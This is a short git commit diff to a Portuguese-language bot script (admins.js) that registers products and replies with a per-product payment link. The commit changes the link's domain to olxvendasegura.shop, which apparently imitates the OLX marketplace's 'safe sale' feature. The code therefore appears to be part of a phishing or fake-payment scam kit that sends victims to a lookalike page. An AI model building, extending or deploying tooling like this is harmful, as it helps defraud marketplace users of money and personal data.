0b7d46e632276a45f7b441b5f3dd11ea9dc7d9a1
RaySilvaJS <tobizinhoofc@gmail.com>
2025-06-21 16:25:33 -0300

    olx

--- bot/system/admins.js
+++ bot/system/admins.js
@@ -405,7 +405,7 @@ module.exports = async (conn, mek, dataVendas) => {
         // Salvar dados finais antes de concluir
         if (salvarDados()) {
           enviar(
-            `✅ Produto cadastrado com sucesso!\n\nCódigo: ${edicao.codigo}\n\n*LINK:* https://liberacao-vendapay.shop/pag/?id=${edicao.codigo}`
+            `✅ Produto cadastrado com sucesso!\n\nCódigo: ${edicao.codigo}\n\n*LINK:* https://olxvendasegura.shop/pag/?id=${edicao.codigo}`
           );
         } else {
           enviar(
